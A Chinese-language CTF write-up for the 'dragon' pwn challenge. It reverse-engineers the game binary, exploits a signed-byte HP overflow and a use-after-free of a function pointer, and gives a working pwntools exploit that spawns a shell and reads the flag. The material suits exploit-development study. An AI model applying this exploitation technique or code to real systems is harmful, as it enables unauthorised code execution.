---
title: pwnable.kr_dragon
top: false
comment: false
lang: zh-CN
date: 2021-11-29 23:04:25
tags:
categories:
  - CTF
  - PWN
  - wp
  - pwnable.kr
---

# dragon

## 信息收集

### checksec

```
[*] '/home/klose/ctf/pwn/file/buuctf/pwnable_dragon/dragon'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

32位程序，开了`canary`和`NX`；

### 程序执行

```
$ ./dragon 
Welcome to Dragon Hunter!
Choose Your Hero
[ 1 ] Priest
[ 2 ] Knight
```

### IDA

放到ida32里分析，程序的执行流程大概如下：

```c
int main()
{
  puts("Welcome to Dragon Hunter!");
  PlayGame();
  return 0;
}

int PlayGame()
{
  int result; // eax
// ...
      puts("Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight");
      result = GetChoice();
      if ( result != 1 && result != 2 )
        break;
      FightDragon(result);
    }
    if ( result != 3 )
      break;
    SecretLevel();
  }
  return result;
}
```

这里看到有一个`SecretLevel()`的函数可以执行，选择`3`即可；

```c
unsigned int SecretLevel()
{
  char s1[10]; // [esp+12h] [ebp-16h] BYREF
// ...
  printf("Welcome to Secret Level!\nInput Password : ");
  __isoc99_scanf("%10s", s1);
  if ( strcmp(s1, "Nice_Try_But_The_Dragons_Won't_Let_You!") )
  {
    puts("Wrong!\n");
    exit(-1);
  }
  system("/bin/sh");
// ...
}
```

可以看到，如果通过了`strcmp()`的比较字符串函数，就可以成功执行`system("/bin/sh")`提权，但是看到`s1[10]`最多只能容纳10个字符，因此比较会失败；

回过头来，选择1或者2进入`FightDragon()`函数；

```c
void __cdecl FightDragon(int character_choice)
{
  char v1; // al
  int v2; // [esp+10h] [ebp-18h]
  _DWORD *ptr; // [esp+14h] [ebp-14h]
  _DWORD *v4; // [esp+18h] [ebp-10h]
  void *v5; // [esp+1Ch] [ebp-Ch]

  ptr = malloc(0x10u);                          // character
  v4 = malloc(0x10u);                           // dragon
  v1 = Count++;
  if ( (v1 & 1) != 0 )                  		// Mama Dragon
  {
    v4[1] = 1;
    *((_BYTE *)v4 + 8) = 80;
    *((_BYTE *)v4 + 9) = 4;
    v4[3] = 10;
    *v4 = PrintMonsterInfo;                     // 打印龙的信息的函数指针
    puts("Mama Dragon Has Appeared!");
  }
  else											// Baby Dragon
  {
    v4[1] = 0;
    *((_BYTE *)v4 + 8) = 50;
    *((_BYTE *)v4 + 9) = 5;
    v4[3] = 30;
    *v4 = PrintMonsterInfo;                     // 打印龙的信息的函数指针
    puts("Baby Dragon Has Appeared!");
  }
  if ( character_choice == 1 )					// 玩家选择Priest
  {
    *ptr = 1;
    ptr[1] = 42;
    ptr[2] = 50;
    ptr[3] = PrintPlayerInfo;
    v2 = PriestAttack((int)ptr, v4);			// 返回1:龙被击败，返回0：玩家被击败
  }
  else
  {
    if ( character_choice != 2 )
      return;
    *ptr = 2;
    ptr[1] = 50;
    ptr[2] = 0;
    ptr[3] = PrintPlayerInfo;
    v2 = KnightAttack((int)ptr, v4);			// 返回1:龙被击败，返回0：玩家被击败
  }
  if ( v2 )										// 如果龙被击败
  {
    puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    v5 = malloc(0x10u);							// malloc一个新的chunk
    __isoc99_scanf("%16s", v5);					// 允许往chunk输入数据
    puts("And The Dragon You Have Defeated Was Called:");
    ((void (__cdecl *)(_DWORD *))*v4)(v4);      // 执行函数指针所指函数，但是之前这个ptr已经被free掉
  }
  else
  {
    puts("\nYou Have Been Defeated!");
  }
  free(ptr);									// free玩家角色的指针
}
```

看一下其中一个角色的进攻函数，如`KnighAttack()`；

```c
int __cdecl KnightAttack(int a1, void *ptr)
{
  int v2; // eax

  do
  {
    (*(void (__cdecl **)(void *))ptr)(ptr);
    (*(void (__cdecl **)(int))(a1 + 12))(a1);
    v2 = GetChoice();
    if ( v2 == 1 )
    {
      printf("Crash Deals %d Damage To The Dragon!\n", 20);
      *((_BYTE *)ptr + 8) -= 20;
      printf("But The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));
      *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);
      printf("And The Dragon Heals %d HP!\n", *((char *)ptr + 9));
      *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);
    }
    else if ( v2 == 2 )
    {
      printf("Frenzy Deals %d Damage To The Dragon!\n", 40);
      *((_BYTE *)ptr + 8) -= 40;
      puts("But You Also Lose 20 HP...");
      *(_DWORD *)(a1 + 4) -= 20;
      printf("And The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));
      *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);
      printf("Plus The Dragon Heals %d HP!\n", *((char *)ptr + 9));
      *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);
    }
    if ( *(int *)(a1 + 4) <= 0 )				// 如果玩家的血量 <= 0，free ptr，返回v2=0，即玩家失败
    {
      free(ptr);
      return 0;
    }
  }
  while ( *((char *)ptr + 8) > 0 );				// 如果龙的血量 >0，则不断循环，龙被击败则返回v2=1
  free(ptr);
  return 1;
}
```

## 漏洞利用

通过上述代码的分析，我们可以利用`uaf`来执行目标函数`system("/bin/sh")`，即：`free(ptr)`后，立马`malloc`一个同样大小的堆块，因此`ptr`被重新利用，输入`system("/bin/sh")`的地址即可拿到shell；

但是前提是需要击败龙赢得游戏，如果按照正常逻辑来玩是不可能打败龙的，但是观察到：

```c
      printf("Crash Deals %d Damage To The Dragon!\n", 20);
      *((_BYTE *)ptr + 8) -= 20;
```

龙的血量是以`_BYTE`数据类型，如果龙的血量` > 127`的话，就会变成负数，判断时当然会满足并退出`while`循环，即：玩家胜利；

观察代码，龙每个回合都会`+4`的血量；

另外，奇数回合是`50`血量的`baby dragon`，而偶数回合是`80`血量的`mama dragon`；

```c
  if ( (v1 & 1) != 0 )                  		// Mama Dragon
  {
    v4[1] = 1;
    *((_BYTE *)v4 + 8) = 80;					// 血量
	// ...
    *v4 = PrintMonsterInfo;                     // 打印龙的信息的函数指针
    puts("Mama Dragon Has Appeared!");
  }
  else											// Baby Dragon
  {
    v4[1] = 0;
    *((_BYTE *)v4 + 8) = 50;					// 血量
	// ...
    *v4 = PrintMonsterInfo;                     // 打印龙的信息的函数指针
    puts("Baby Dragon Has Appeared!");
  }
```

因此自然是和`mama dragon`战斗更容易让它的血量大于127，接下来看能不能苟住不死；

观察到牧师有一个技能是回蓝，并且还有一个技能是消耗蓝来避免遭到攻击，因此巧妙利用这两个技能就可以苟得尽量久，让龙加血自己加到“死”；

每次蓝用两次后就必须要回蓝，因此3技能庇护用两次，2技能回蓝用一次，循环用；

exp如下：

```python
# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'dragon'
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

islocal = 1
if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 26809)

system_addr = 0x08048DBF

# baby dragon
p.sendlineafter("Knight\n", "1")
# baby dragon攻击力比较高，一次扣30滴血，两回合就无了
for i in range(2):
    p.sendlineafter("You Become Temporarily Invincible.\n", '3')
    p.sendlineafter("You Become Temporarily Invincible.\n", '3')
    p.sendlineafter("You Become Temporarily Invincible.\n", '2')

# mama dragon
p.sendlineafter("Knight\n", "1")
# mama dragon攻击力比较低，一次扣10滴血，可以抗5次攻击，这里抗住4次攻击就可以让它的血量恢复到128
# 龙一共回的血：(每回合4血 * 3回合) * 循环4次 = 48, 48 + 80 = 128 > 127
for i in range(4):                 
    p.sendlineafter("You Become Temporarily Invincible.\n", '3')
    p.sendlineafter("You Become Temporarily Invincible.\n", '3')
    p.sendlineafter("You Become Temporarily Invincible.\n", '2')

p.sendlineafter("The World Will Remember You As:\n", p32(system_addr))
p.interactive()
```

得到shell；

```
[*] Switching to interactive mode
And The Dragon You Have Defeated Was Called:
$ cat /flag
flag{K1os32J0yc34ever}
```

